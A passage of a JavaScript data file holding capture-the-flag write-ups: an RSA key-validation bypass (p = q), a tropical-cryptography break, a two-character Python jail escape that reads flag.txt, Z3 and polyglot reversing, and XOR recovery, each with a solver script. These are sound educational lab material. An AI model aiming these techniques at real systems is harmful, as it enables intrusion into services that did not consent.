\`BCCTF{y0U_h4V3_g0T_70_b3_K1DD1n9_Me}\`
`
    },
    {
        id: "pickme",
        ctfId: "bearcatCTF-2026",
        title: "Pick Me",
        category: "Cryptography",
        date: "Feb 22 - 23, 2026",
        flag: "BCCTF{R54_Br0K3n_C0nF1rm3d????}",
        summary: "Exploited a missing uniqueness check in an RSA key validator by submitting a private key where p = q. This caused the server's internal decryption test to fail, intentionally leaking the encrypted flag, which could then be decrypted locally using the correct Euler's totient for n = p^2.",
        tags: ["RSA", "Euler's Totient", "Validation Bypass", "SageMath"],
        content: `
# Pick Me — Writeup

The challenge provides a service that accepts an RSA private key in PEM format and tests it for validity. If the key passes all validation checks, the server encrypts the flag using the provided public key, and then attempts to decrypt it with the private key to ensure everything works.

## Vulnerability: Missing p != q Check

The \`tests\` function in \`server.py\` meticulously checks that \`p\` and \`q\` are primes, their bit lengths are adequate, and that the provided \`d\` matches the calculated \`phi = (p-1)(q-1)\`. 

However, it explicitly misses one standard RSA check: it never verifies that \`p != q\`. 

If we generate a key where \`p = q\`, the modulus becomes \`n = p^2\`. The server calculates \`phi\` as \`(p-1)(q-1) = (p-1)^2\`. While the server accepts our generated \`d\` because it correctly satisfies \`e * d ≡ 1 (mod (p-1)^2)\`, this is **not** the true Euler's totient for \`n = p^2\`. The correct totient function for a prime squared is \`phi(p^2) = p(p-1)\`.

Because the server uses the wrong \`phi\` for decryption, the identity \`m ≡ c^d (mod n)\` fails. This triggers the final catch-all error in the script:
\`\`\`python
if m != pow(c, priv.d, pub.n):
    return f"Some unknown error occurred! Maybe you should take a look: {c}"
\`\`\`
This error conveniently prints the ciphertext \`c\` of the flag.

## The Exploit

1.  **Generate Fake Key:** We generate a single large prime \`p\` and set \`q = p\`. We calculate the dummy variables the server expects, specifically \`d ≡ e^-1 (mod (p-1)^2)\`.
2.  **Bypass Cryptography Validations:** We construct the RSA object and export it to PEM. The \`cryptography\` library normally prevents \`p = q\`, but the server uses \`unsafe_skip_rsa_key_validation=True\`, allowing our malicious PEM to load perfectly.
3.  **Leak the Ciphertext:** We send the PEM to the server, which runs the tests, fails the decryption phase, and leaks \`c = FLAG^e (mod p^2)\`.
4.  **Local Decryption:** Since we know \`p\`, we compute the **real** totient \`phi = p(p-1)\`, calculate the correct decryption exponent \`d_real ≡ e^-1 (mod p(p-1))\`, and decrypt \`c\` to recover the flag.

## SageMath Solver

\`\`\`python
from pwn import remote
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateNumbers, RSAPublicNumbers
from cryptography.hazmat.primitives import serialization

def solve():
    # 1. Generate parameters (p = q)
    p = random_prime(2^1024 - 1, lbound=2^1023)
    q = p
    n = p * q
    e = 65537

    # Calculate the fake parameters the server expects
    phi_fake = (p - 1) * (q - 1)
    d = inverse_mod(e, phi_fake)

    # 2. Construct the PEM key (using unsafe_skip_rsa_key_validation)
    pub = RSAPublicNumbers(int(e), int(n))
    priv = RSAPrivateNumbers(int(p), int(q), int(d), int(d % (p-1)), int(d % (q-1)), 0, pub)

    pem = priv.private_key(unsafe_skip_rsa_key_validation=True).private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )

    # 3. Leak the ciphertext from server
    r = remote('chal.bearcatctf.io', 56025)
    r.sendlineafter(b"pem format:", pem)
    r.recvuntil(b"take a look: ")
    c = int(r.recvline())

    # 4. Decrypt using the REAL totient
    phi_real = p * (p - 1)
    d_real = inverse_mod(e, phi_real)
    m = power_mod(c, d_real, n)
    
    flag = int(m).to_bytes((int(m).bit_length() + 7) // 8, 'big').decode()
    print(f"FLAG: {flag}")

if __name__ == "__main__":
    solve()
\`\`\`

## Flag

\`BCCTF{R54_Br0K3n_C0nF1rm3d????}\`
`
    },
    {
        id: "tropped",
        ctfId: "bearcatCTF-2026",
        title: "Tropped",
        category: "Cryptography",
        date: "Feb 22 - 23, 2026",
        flag: "BCCTF{1_h4T3_M7_Tr0p93D_4Hh_CRyp705ysT3m}",
        summary: "Exploited a custom key exchange protocol based on tropical cryptography (min-plus algebra). By reversing the min-plus matrix multiplication, an equivalent private key was reconstructed to derive the shared secret and decrypt the captured traffic.",
        tags: ["Tropical Cryptography", "Min-Plus Algebra", "Matrix Operations", "SageMath"],
        content: `
# Tropped — Writeup

The challenge implements a custom matrix class called \`TropMatrix\` representing a key exchange mechanism over a tropical semiring. 

## Vulnerability: Reversing Tropical Matrix Multiplication

In standard linear algebra, matrix multiplication involves the sum of products. In the min-plus tropical algebra used by this challenge, multiplication is redefined as the minimum of the sums: \`min(a + b for a, b in zip(rA, cB))\`. 

The protocol operates as follows:
* A public 64x64 matrix \`M\` is generated.
* Alice and Bob generate private vectors \`a\` (row) and \`b\` (column).
* They publicly exchange the products \`aM\` and \`Mb\`. 
* The shared secret is the product \`aMb\`.
* Encryption is performed by XORing the plaintext byte with the shared secret modulo 32: \`(aMb.mat[0][0] % 32) ^ ord(enc_byte)\`.

While min-plus multiplication is non-linear and lacks a true inverse, it is highly susceptible to algebraic attacks. We do not need to find Alice's exact private vector \`a\`. Instead, we can construct an **equivalent** vector \`a_hat\` that acts identically when multiplied by \`M\`.

Because \`aMj = min_i (ai + Mi,j)\`, we know that for all \`i\` and \`j\`, \`aMj ≤ ai + Mi,j\`. 
Rearranging this inequality gives \`ai ≥ aMj - Mi,j\`. 
By taking the maximum across all columns \`j\`, we satisfy all constraints and recover an equivalent private key \`a_hat\`.

## The Exploit

1.  **Parse Public Data:** Load the public matrix \`M\`, the exchanged vectors \`aM\` and \`Mb\`, and the encrypted characters from \`output.txt\`.
2.  **Tropical Division:** Calculate the equivalent private row vector \`a_hat\` using the relation: \`max(aM[j] - M[i][j] for j in range(n))\`.
3.  **Compute Shared Secret:** Multiply the reconstructed \`a_hat\` with the intercepted column vector \`Mb\` using tropical multiplication: \`min(a_hat[i] + Mb[i] for i in range(n))\`.
4.  **Decrypt:** XOR the resulting shared secret modulo 32 with the encrypted characters to reveal the plaintext.

## SageMath Solver

\`\`\`python
import json
import operator

def solve():
    # Load the captured handshake data
    with open('output.txt', 'r') as f:
        lines = f.read().strip().split('\\n')

    # Parse public matrix M from the first line
    M = json.loads(lines[0])['M']
    n = len(M)
    flag = ""
    
    # Iterate through intercepted exchanges
    for line in lines[1:]:
        data = json.loads(line)
        aM = data['aM'][0]
        Mb = [row[0] for row in data['Mb']]
        enc_char = data['enc_char']
        
        # Tropical Division: Reconstruct an equivalent private vector a_hat
        a_hat = [max(aM[j] - M[i][j] for j in range(n)) for i in range(n)]
        
        # Compute Shared Secret S = a_hat @ Mb
        S = min(a_hat[i] + Mb[i] for i in range(n))
        
        # Decrypt character
        pt_char = chr(operator.xor(int(S % 32), ord(enc_char)))
        flag += pt_char
            
    print(f"Decrypted Message: {flag}")

if __name__ == "__main__":
    solve()
\`\`\`

## Flag

\`BCCTF{1_h4T3_M7_Tr0p93D_4Hh_CRyp705ysT3m}\`
`
    },
    {
        id: "brig",
        ctfId: "bearcatCTF-2026",
        title: "The Brig",
        category: "Misc",
        date: "Feb 22 - 23, 2026",
        flag: "BCCTF{1--1--1--1--111--111--1111_e1893d6cdf}",
        summary: "Bypassed a Python jail restricted to two characters by mathematically encoding a text payload into a massive integer using only '1' and '-'. Applied a balanced base-10 algorithm to minimize the expression's length, fitting it perfectly under the 4096-character limit.",
        tags: ["PyJail", "Python", "Math", "eval", "Encoding"],
        content: `
# The Brig — Writeup

The challenge drops us into a restrictive Python jail. We are allowed to provide two characters of our choosing, and then we must construct a payload strictly using those two characters. 

## The Jail Setup

The restriction mechanism is quite simple but deadly:
* **Contraband Check:** Our input must consist of exactly two unique characters.
* **Tool Check:** The secondary payload can only consist of characters from that initial set of two.
* **Time Limit:** The length of our payload must be strictly less than \`2^12\` (4096) characters.
* **Execution:** The payload is evaluated as a Python expression. The resulting integer is converted to bytes via \`long_to_bytes\`, and those bytes are evaluated a second time as Python code: \`eval(long_to_bytes(eval(inp)))\`.

Our goal is to execute \`open('flag.txt').read()\`. To do this, we need to convert this string into a large integer \`N\` (\`N ≈ 3.28 x 10^55\`), and then write a mathematical expression that evaluates exactly to \`N\` using only our two characters. 

The fake flag in the log file, \`BCCTF{1--1--1--1--111--111--1111_e1893d6cdf}\`, acts as a massive hint: we should choose \`1\` and \`-\` as our characters.

## Payload Encoding Strategy

We can represent any number as a sum and difference of sequences of ones (\`1, 11, 111, ...\`). 
Let \`Rj\` be a sequence of \`j\` ones. Since \`10^j = 9Rj + 1\`, it is mathematically equivalent to say that \`10^j = R_{j+1} - Rj\`. 

If a number \`N\` is written in base-10 as \`N = Σ di 10^i\`, we can rewrite it using our sequences of ones by substituting \`10^i\`:

\`N = Σ cj Rj\`

Where the coefficient \`cj\` for the sequence of \`j\` ones is exactly the difference between adjacent digits: \`cj = dj-1 - dj\`.

## Balanced Digits Optimization

If we strictly use standard base-10 digits (\`0\` to \`9\`), the absolute values of our coefficients \`cj\` will occasionally be large, causing our payload to require too many ones and exceed the 4096-character limit. 

To minimize the expression's length, we can use a **balanced base-10 representation**. By allowing digits to range from \`-5\` to \`5\` (borrowing/carrying to the next digit when necessary), we drastically shrink the average difference between adjacent digits. 

* For positive coefficients, we prepend \`--\` (which acts mathematically as addition: \`- -111 = +111\`).
* For negative coefficients, we prepend \`-\` (standard subtraction).

By applying this optimized math, the payload for \`open('flag.txt').read()\` shrinks to exactly 2561 characters, seamlessly bypassing the jail's constraints.

## Python Solver Script

\`\`\`python
#!/usr/bin/env python3
from pwn import remote

def encode_number(n):
    # 1. Convert to balanced base-10 (digits from -5 to 5)
    digits = []
    while n > 0:
        d = n % 10
        if d > 5:
            d -= 10
            n += 10
        digits.append(d)
        n //= 10
    digits.append(0) # Pad the final carry
    
    # 2. Compute coefficients c_j = d_{j-1} - d_j
    c = [digits[i] - digits[i+1] for i in range(len(digits)-1)]
    
    # 3. Construct the '1' and '-' expression
    expr = ""
    for i, count in enumerate(c):
        j = i + 1
        if count > 0:
            for _ in range(count):
                if expr == "":
                    expr += "1" * j
                else:
                    expr += "--" + "1" * j
        elif count < 0:
            for _ in range(-count):
                if expr == "":
                    expr += "-" + "1" * j
                else:
                    expr += "-" + "1" * j
    return expr

def solve():
    target = b"open('flag.txt').read()"
    n = int.from_bytes(target, "big")
    
    payload = encode_number(n)
    print(f"[*] Payload generated! Length: {len(payload)}")
    
    # Connection logic...
    # r = remote('chal.bearcatctf.io', 36990)
    # r.sendline(b'1-')
    # r.sendline(payload.encode())
\`\`\`

## Flag

\`BCCTF{1--1--1--1--111--111--1111_e1893d6cdf}\`
`
    },
    {
        id: "captain-morgan",
        ctfId: "bearcatCTF-2026",
        title: "Captain Morgan",
        category: "Reverse Engineering",
        date: "Feb 22 - 23, 2026",
        flag: "BCCTF{Y00_hO_Ho_anD_4_B07Tl3_oF_rUm}",
        summary: "Bypassed an obfuscated Python logic circuit by symbolically executing the script using the Z3 theorem prover to find the input that yields the 'correct' execution path.",
        tags: ["Reverse Engineering", "Z3", "Symbolic Execution", "Obfuscation", "Python"],
        content: `
# Captain Morgan — Writeup

The challenge provides an obfuscated Python file, \`chall.py\`, which takes user input, converts it into an integer, and processes it through a massive block of bitwise operations. At the end of the execution, the script evaluates a final variable, \`bfu\`, to decide whether to print "correct" or "incorrect".

## Vulnerability: Symbolic Execution

Instead of manually deciphering the complex, obfuscated bitwise logic, we can leverage symbolic execution. Since the entire validation routine consists of standard mathematical and bitwise operations, it can be modeled perfectly by an SMT solver like **Z3**.

## The Exploit

1.  **Patch the Input:** We replace the hardcoded input mechanisms in \`chall.py\` with a symbolic Z3 \`BitVec\` variable named \`ari\`. A size of 300 bits is chosen to ensure it is large enough to hold the expected flag.
2.  **Dynamic Execution:** We execute the obfuscated logic dynamically within a controlled Python dictionary (\`env\`) using the \`exec()\` function. This allows the Python interpreter to build the Z3 constraint tree for us automatically.
3.  **Constraint Solving:** The original script prints "correct" if \`bfu == 0\` (since \`"in" * 0\` evaluates to an empty string). We add this condition as a constraint to our Z3 solver.
4.  **Extraction:** We ask Z3 to satisfy the constraints, extract the solved integer for \`ari\`, and convert it back to bytes to reveal the flag.

## Z3 Solver Script

\`\`\`python
import z3

# Load the obfuscated challenge code
with open("chall.py", "r") as f:
    chall_code = f.read()

# Locate the start of the circuit logic
start_idx = chall_code.find('iv=(dr:=')

# Inject Z3 setup instead of the original raw input
z3_setup = """
import z3
ari = z3.BitVec('ari', 300) 
bhy = 1
aja = 1
"""
eval_code = z3_setup + chall_code[start_idx:]

# Remove the original print statement
end_idx = eval_code.rfind('print("in"*bfu+"correct")')
eval_code = eval_code[:end_idx]

# Execute the circuit to build the constraint tree
env = {}
exec(eval_code, env)

# Solve for bfu == 0
s = z3.Solver()
s.add(env['bfu'] == 0)

if s.check() == z3.sat:
    model = s.model()
    flag_int = model[env['ari']].as_long()
    flag_bytes = flag_int.to_bytes((flag_int.bit_length() + 7) // 8, 'big')
    print(f"Flag: BCCTF{{{flag_bytes.decode()}}}")
\`\`\`

## Flag

\`BCCTF{Y00_hO_Ho_anD_4_B07Tl3_oF_rUm}\`
`
    },
    {
        id: "missing-one-piece",
        ctfId: "bearcatCTF-2026",
        title: "Missing One Piece",
        category: "Reverse Engineering",
        date: "Feb 22 - 23, 2026",
        flag: "BCCTF{I_gU3S5_7hAt_Wh1t3BeArD_6uY_W45_TRu7h1n6!}",
        summary: "Analyzed the binary strings to discover environmental checks. Satisfied the conditions by creating a specific directory (/tmp/gogear5), renaming the executable (devilishFruit), and setting an environment variable (ONE_PIECE=IS_REAL) to trick the binary into printing the flag.",
        tags: ["Reverse Engineering", "Linux", "Environment Variables", "Strings"],
        content: `
# Missing One Piece — Writeup

The challenge provides an ELF binary originally named \`missing_one_piece\`. 

## Vulnerability: Environmental Checks

By running basic static analysis (like the \`strings\` command) on the binary, several interesting artifacts stand out:
* \`/tmp/gogear5\`
* \`ONE_PIECE=IS_REAL\`
* \`./devilishFruit\`
* \`you_dont_need_to_rev_this\`

As the \`you_dont_need_to_rev_this\` string implies, we don't need to decompile and decipher complex assembly logic. The binary simply checks its execution environment before deciding whether to reveal the flag. Specifically, it verifies three conditions:

1.  **Directory Location:** It expects to be executed from inside \`/tmp/gogear5/\`.
2.  **Filename:** The binary expects to be called \`devilishFruit\`.
3.  **Environment Variable:** It checks if the environment variable \`ONE_PIECE\` is set to the value \`IS_REAL\`.

If any of these conditions are missing, the program terminates with an error: *"It seems the One Piece is nowhere to be found..."*

## The Exploit

To solve the challenge, we recreate the exact environment the binary is searching for:

1.  **Create Directory:** Create the required \`/tmp/gogear5\` path.
2.  **Setup Executable:** Copy and rename the binary to \`devilishFruit\`.
3.  **Set Permissions:** Ensure the binary has execution privileges.
4.  **Inject Variable:** Execute the binary with the \`ONE_PIECE\` environment variable set.

Once the environment is properly spoofed, the binary reveals the flag.

## Bash Solver

\`\`\`bash
# Create the expected directory
mkdir -p /tmp/gogear5

# Copy and rename the executable
cp missing_one_piece /tmp/gogear5/devilishFruit

# Navigate to the environment
cd /tmp/gogear5

# Run with the required environment variable
ONE_PIECE=IS_REAL ./devilishFruit
\`\`\`

## Flag

\`BCCTF{I_gU3S5_7hAt_Wh1t3BeArD_6uY_W45_TRu7h1n6!}\`
`
    },
    {
        id: "pollys-key",
        ctfId: "bearcatCTF-2026",
        title: "Polly's Key",
        category: "Reverse Engineering",
        date: "Feb 22 - 23, 2026",
        flag: "BCCTF{Th3_P05h_9oLly61Ot_p4rr0t}",
        summary: "Reversed a complex Ruby/Perl polyglot script that validated a 50-character key. The solution involved mathematically modeling Ruby's primitive root constraints, emulating Perl's string-to-hex coercion quirks, and reversing an insertion sort based on a hardcoded swap array to recover the master key and decrypt the flag.",
        tags: ["Reverse Engineering", "Polyglot", "Ruby", "Perl", "Math", "Insertion Sort"],
        content: `
# Polly's Key — Writeup

The challenge provides a file named \`pollys_key\`, which is a highly obfuscated **Polyglot** script. A polyglot is a program that is valid in multiple programming languages—in this case, **Perl** and **Ruby**. The script uses language-specific comment syntax (\`=begin\`, \`=end\`, \`=cut\`) to execute different logic branches depending on which interpreter is running it.

## Vulnerability & Analysis

To get the flag, we need to supply a 50-character key that satisfies the conditions of both the Ruby and Perl execution paths. 

### 1. The Ruby Path (Primitive Roots)
The script limits the pool of valid characters. It takes each character, shifts it by 16, and ensures that the result is a **primitive root modulo 257**. This mathematical constraint narrows down the valid ASCII printable space (excluding the caret \`^\`) to exactly 50 unique characters.
    
### 2. The Perl Path (Coercion & Sorting)
Perl performs a bizarre mathematical transformation on each character using a string-to-hex coercion trick (e.g., evaluating \`65\` as \`"65" + hex(65) -> 65101\`) and takes the result modulo 257. 

After this transformation, Perl performs a 52-element insertion sort on the string. The number of swaps required to sort the array is recorded and validated against a hardcoded array, \`sArray\`.

### 3. Decryption
If all checks pass, the script takes the MD5 hash of our input key and XORs it against a hardcoded array called \`encTreasure\` to yield the flag.

## The Exploit

Instead of bruteforcing \`50!\` combinations, we can reverse the operations step-by-step:

1.  **Determine the Character Pool:** Calculate the 50 valid characters using the modulo 257 primitive root logic.
2.  **Emulate Perl Transformation:** Apply the Perl string-to-hex coercion to our pool of valid characters to see their transformed values.
3.  **Reverse the Insertion Sort:** We take the sorted array of transformed values and iterate backwards through the hardcoded \`sArray\` swap counts. By "unswapping" the elements, we recover the original unsorted order of the input.
4.  **Resolve Ambiguities:** A few characters map to the same transformed values, but the script contains specific ordering rules (e.g., \`A\` must come before \`a\`). We filter our candidate permutations through these rules.
5.  **Decrypt the Flag:** Hash the recovered key and XOR it with the \`encTreasure\` array.

## Solver Script

\`\`\`python
import hashlib
import itertools

# Arrays from the source
enc_treasure = [76, 77, 65, 83, 67, 121, 85, 100, 48, 94, 91, 48, 53, 102, 82, 55, 97, 73, 111, 123, 61, 52, 76, 116, 95, 116, 58, 123, 119, 54, 120, 127]
sArray = [0, 2, 3, 4, 0, 2, 6, 2, 2, 2, 2, 3, 9, 8, 0, 11, 17, 13, 11, 16, 14, 20, 6, 19, 6, 13, 26, 1, 1, 28, 15, 1, 14, 9, 14, 29, 3, 7, 23, 26, 9, 0, 41, 3, 30, 11, 1, 20, 10, 2, 27]

# 1. Ruby primitive root logic limits our pool to exactly 50 valid ASCII characters
valid_chars = []
for c in range(33, 127):
    if c == 94: continue # Caret (^) is banned
    val = (c - 16) % 257
    if pow(val, 128, 257) != 1:
        valid_chars.append(c)

# 2. Emulate Perl's coercion behavior
def perl_transform(c_ord):
    hex_val = int(str(c_ord), 16)
    concated = int(str(c_ord) + str(hex_val))
    return concated % 257

transform_map = {}
transformed_vals = []
for c in valid_chars:
    t = perl_transform(c)
    if t not in transform_map:
        transform_map[t] = []
    transform_map[t].append(c)
    transformed_vals.append(t)

# Account for Perl's internal string handling
transformed_vals.append(perl_transform(10)) 
transformed_vals.append(perl_transform(47)) 

# 3. Reverse Perl's 52-element insertion sort
arr = sorted(transformed_vals)
for i in range(50, -1, -1):
    s = sArray[i]
    val = arr.pop(i + 1 - s)
    arr.insert(i + 1, val)

# 4. Map back to characters
possible_chars = [[chr(c) for c in transform_map[t]] for t in arr[:50]]

# 5. Check constraints and decrypt
for combo in itertools.product(*possible_chars):
    user_key = "".join(combo)
    if len(set(user_key)) != 50: continue
    
    # Ordering rules from the script
    idx = lambda c: user_key.index(c) if c in user_key else 0
    if idx('\`') > idx('8') or idx('6') > idx('u') or idx('@') > idx('u'): continue
    if idx('A') > idx('a') or idx('c') > idx('F') or idx('O') > idx('p'): continue
    
    md5_hash = hashlib.md5(user_key.encode()).hexdigest()
    treasure = "".join(chr(int(md5_hash[i], 16) ^ enc_treasure[i]) for i in range(32))
    print(f"Flag: {treasure}")
    break
\`\`\`

## Flag

\`BCCTF{Th3_P05h_9oLly61Ot_p4rr0t}\`
`
    },
    {
        id: "favoriteprogramminglanguage",
        ctfId: "bearcatCTF-2026",
        title: "Favorite Programming Language",
        category: "Reverse Engineering",
        date: "Feb 22 - 23, 2026",
        flag: "BCCTF{Pr3t7y_5UR3_1tS_C!!1!}",
        summary: "Reversed a script written in R that encrypted user input using a combination of bitwise AND, OR, and NOT operations. These operations formed a logical XOR gate, allowing the flag to be recovered by reapplying the same transformation to the hardcoded ciphertext.",
        tags: ["Reverse Engineering", "R", "XOR", "Bitwise Operations"],
        content: `
# Favorite Programming Language — Writeup

The challenge provides a script named \`FavoriteProgrammingLanguage\`. From the syntax—specifically the assignment operator \`<-\`, the 1-based indexing in \`for (i in 1:14)\`, and functions like \`cat()\` and \`utf8ToInt()\`—we can quickly identify the language as **R**.

## Vulnerability: Obfuscated XOR

The script expects an input of exactly 28 characters. It then splits the input into two halves and applies a transformation to each character before comparing the final result to a hardcoded ciphertext: \`CA@PC}Wz:~<uR;[_?T;}[XE$%2#|\`.

The core transformation looks like this:
\`\`\`R
inputVector[i] = bitwAnd(bitwOr(inputVector[i], i), bitwNot(bitwAnd(inputVector[i], i)))
\`\`\`

This is a classic boolean algebra obfuscation. If we map it out logically, we have:

\`(A ∨ B) ∧ ¬(A ∧ B)\`

This is the exact logical definition of the **Exclusive OR (XOR)** operation (\`A ⊕ B\`). 

* For the first 14 characters, the key \`B\` is the 1-based index \`i\`.
* For the last 14 characters (\`i \\in [15, 28]\`), the key \`B\` is \`(29 - i)\`.

## The Exploit

One of the most fundamental properties of the XOR operation is that it is its own inverse (involutory): \`(A ⊕ B) ⊕ B = A\`. 

Because the encryption is just an XOR with a deterministic sequence of keys based on the character's index, we don't need to write a complex decryption routine. We simply apply the exact same XOR operations to the hardcoded ciphertext, and it will perfectly reverse the encryption to reveal the flag.

## Python Solver Script

\`\`\`python
def solve():
    ct = "CA@PC}Wz:~<uR;[_?T;}[XE$%2#|"
    res = list(ct)
    
    # Process the first 14 characters (1-indexed in R) 
    for i in range(1, 15):
        char_code = ord(res[i-1])
        # bitwAnd(bitwOr(a, b), bitwNot(bitwAnd(a, b))) is XOR
        res[i-1] = chr(char_code ^ i)
        
    # Process the last 14 characters 
    for i in range(15, 29):
        char_code = ord(res[i-1])
        res[i-1] = chr(char_code ^ (29 - i))
        
    return "".join(res)

if __name__ == "__main__":
    print(f"The required input is: {solve()}")
\`\`\`

## Flag

\`BCCTF{Pr3t7y_5UR3_1tS_C!!1!}\`
`
    },
    {
        id: "river-raiders",
        ctfId: "bearcatCTF-2026",
        title: "River Raiders",
        category: "OSINT",
        date: "Feb 22 - 23, 2026",
        flag: "BCCTF{John A. Roebling Suspension Bridge}",
        summary: "Identified a historical ship replica and its location in Cincinnati using visual clues from a provided image. Used geographical research to name the specific suspension bridge in the background.",
        tags: ["OSINT", "Geolocation", "Visual Research", "Historical Replicas"],
        content: `
# River Raiders — Writeup

The challenge provides an image of a historical sailing ship passing under a large blue suspension bridge.

## Analysis

The ship in the image is a replica of the Pinta, one of the three ships used by Christopher Columbus. These replicas frequently tour various river cities in the United States.

### Identifying the Location
By researching recent sightings and news articles concerning the Pinta replica, we find reports of it visiting the **Cincinnati/Newport** area along the Ohio River. The replica is known for its "Great Loop" tours through America's inland waterways.

### Identifying the Bridge
The image prominently features a distinctive blue suspension bridge in the background. A search for "suspension bridge in Cincinnati" immediately identifies the **John A. Roebling Suspension Bridge**. 

This bridge is a National Historic Landmark, completed in 1866. At the time of its opening, it was the longest suspension bridge in the world. It famously served as a precursor and engineering prototype for the Brooklyn Bridge, which Roebling designed later.

## Solution

1.  **Analyze Clues:** Identify the ship as a historical caravel replica.
2.  **Geographic Scoping:** Link the ship's 2023 tour to its stop in Cincinnati/Newport.
3.  **Bridge Verification:** Match the architectural features (blue color, stone towers, suspension cables) to the John A. Roebling Suspension Bridge.

## Flag

\`BCCTF{John A. Roebling Suspension Bridge}\`
`
    },
    {
        id: "ezrsa",
        ctfId: "ramadanCTF-2026",
        title: "EzRSA",
        category: "Cryptography",
        summary: "A classic RSA challenge where the modulus n is composed of two primes that are relatively close to each other, rendering it vulnerable to Fermat's Factorization.",
        tags: ["crypto", "rsa", "fermat", "factordb"],
        content: `
# EzRSA

## Challenge Description
We are provided with a Python script \`chal.py\` and an output file \`output.txt\`. The script generates two 1024-bit primes, $p$ and $q$, multiplies them to get $n$, and encrypts a flag using standard RSA with $e=65537$.

## Vulnerability Analysis
The security of RSA relies on the difficulty of factoring $n$ into $p$ and $q$. However, if $p$ and $q$ are generated in a way that makes them "close" to each other (i.e., $|p - q|$ is small), we can use **Fermat's Factorization**.

Fermat's Factorization relies on the fact that if $p$ and $q$ are close, $n$ can be expressed as a difference of squares:
$$n = a^2 - b^2 = (a-b)(a+b)$$
where $a \\approx \\sqrt{n}$. We can search for $a$ starting from $\\lceil\\sqrt{n}\\rceil$ and check if $a^2 - n$ is a perfect square.

Alternatively, since this is a CTF challenge, the prime factors might already be known and stored in **FactorDB**.

## Solution Script
The following solver script attempts to retrieve factors from FactorDB first. If that fails, it employs Fermat's Factorization to recover $p$ and $q$, derives the private key, and decrypts the flag.

\`\`\`python
import urllib.request
import json
from Crypto.Util.number import long_to_bytes
from math import isqrt

# Given parameters from output.txt
n = 12139060964644731299616588431144357295893267399513044368168674423463865922105679298581275775928030934980825037505343533330532571920073270930494856617633446603701570111731333521968321149524054928051226723496783699003262124686452853097178492606004846446132558563235032863230996887915790170744047365490053682585227928502155463679243464129824500488865322057558073443748579179673923873951539414050323136771458433363878212559520936505989861408021168584818265882088807751868274225219033214124264482250739877294262244348169816175715334853867011387005662752280370313684398535181288043659304611812082202634455705893735722144691
e = 65537
c = 2027061416518539479227361922503073616455584052179531114664299751979222876324402343920874746923263105838961615269889480729305386812288353942096836088189138045056661651351561704740399755324098095245350717206509435579347680523366257195142346380022013984134393207328313972552189607141838671464207713340780455198087734627261571224948916053344495541325279422710899259606254672851662179439172534792519654723049214197013878859128524628078962920429097010773719219281227340703928176601061418390449183543575468085737641002867191684818036182905347659400615796230893276884470919389823485665892343397687944728461714491295766674366

def get_factors_factordb(n):
    """Attempt to pull factors from FactorDB API."""
    try:
        url = f"http://factordb.com/api?query={n}"
        req = urllib.request.urlopen(url)
        data = json.loads(req.read().decode())
        if data.get('status') == 'FF':
            factors = [int(f[0]) for f in data.get('factors')]
            if len(factors) == 2:
                return factors[0], factors[1]
    except Exception as err:
        print(f"[-] FactorDB lookup failed: {err}")
    return None, None

def fermat_factorization(n):
    """Attempt Fermat's factorization if p and q are close."""
    a = isqrt(n)
    b2 = a*a - n
    b = isqrt(b2)
    count = 0
    
    # Limit iterations so it doesn't hang forever
    while b*b != b2 and count < 1000000:
        a = a + 1
        b2 = a*a - n
        b = isqrt(b2)
        count += 1
    
    if b*b == b2:
        return a - b, a + b
    return None, None

print("[*] Attempting to break RSA...")

# 1. Try FactorDB first
p, q = get_factors_factordb(n)

# 2. Try Fermat's if FactorDB fails
if not p:
    print("[*] FactorDB returned nothing. Trying Fermat's Factorization...")
    p, q = fermat_factorization(n)

# 3. Decrypt if factors were found
if p and q:
    print(f"[+] Successfully factored N!")
    
    # Calculate Euler's totient
    phi = (p - 1) * (q - 1)
    
    # Calculate private exponent d
    d = pow(e, -1, phi)
    
    # Decrypt ciphertext c
    m = pow(c, d, n)
    
    print(f"[+] Flag: {long_to_bytes(int(m)).decode('utf-8')}")
else:
    print("[-] Could not factor N using standard quick methods.")
\`\`\`

## Flag
\`VBD{ae746bf43346cc8cbc6d613d8e8da1f3}\`
`
    },
    {
        id: "enc101",
        ctfId: "ramadanCTF-2026",
        title: "Enc101",
        category: "Reverse Engineering",
        summary: "Recovered a hidden flag from an obfuscated, XOR-encrypted Java class file by executing a Known Plaintext Attack (KPA) against the embedded encrypted array.",
        tags: ["Reverse Engineering", "Java", "XOR", "Known Plaintext Attack", "KPA"],
        content: `
# Enc101 — Writeup

## Overview

This Java reverse engineering challenge involves a protected vault mechanism. The main application prompts for a secret passphrase, but the core logic and flag are hidden away inside dynamically loaded, encrypted \`.class\` files. The solution requires decrypting the hidden class files, analyzing the obfuscated bytecode, and executing a Known Plaintext Attack (KPA) to recover the XOR key and the flag.

---

## Step 1: JAR Analysis & Class Decryption

Extracting the provided \`challenge.jar\` reveals an unusual directory structure. Alongside the standard \`com.vulnbydefault.ctf.Main\` class, there is a suspicious hidden directory located at \`META-INF/.classes/\`. 

This directory contains protected files:
* \`com.vulnbydefault.ctf.FlagKeeper\`
* \`com.vulnbydefault.ctf.Main\`
* \`org.springframework.config.PassHash\`

The \`FlagKeeper\` class file is XOR-encrypted to prevent standard decompilation. By extracting the hex key \`eff263f8cc440753acf1c01d02b3756b\` (likely tied to the \`PassHash\` configuration), we can XOR the file byte-by-byte to reconstruct the valid Java bytecode.

---

## Step 2: Bytecode Analysis & De-obfuscation

Disassembling the decrypted \`FlagKeeper.class\` using \`javap\` reveals that the author attempted to disrupt static analysis by padding the methods with extensive sequences of \`nop\` (no operation) instructions.

However, the critical information is stored in the static initializer block (\`<clinit>\`). This block defines an integer array named \`ENC\`. Analyzing the bytecode instructions (\`bipush\`, \`iastore\`) reveals the exact contents being loaded into this array:

\`[4, 3, 9, 90, 107, 121, 125, 24, 48, 117, 117, 20, 54, 115, 44, 66, 48, 118, 126, 24, 100, 35, 126, 19, 106, 34, 121, 16, 51, 113, 47, 16, 107, 32, 44, 25, 47]\`

---

## Step 3: Known Plaintext Attack (KPA)

The array contains the XOR-encrypted flag. Because the XOR cipher is vulnerable to Known Plaintext Attacks, and we know the standard flag format for this CTF is \`VBD{\`, we can reverse-engineer the repeating key by XORing the known plaintext characters against the first four integers in the \`ENC\` array.

* \`V\` (ASCII 86) ^ \`4\` = \`82\` (**R**)
* \`B\` (ASCII 66) ^ \`3\` = \`65\` (**A**)
* \`D\` (ASCII 68) ^ \`9\` = \`77\` (**M**)
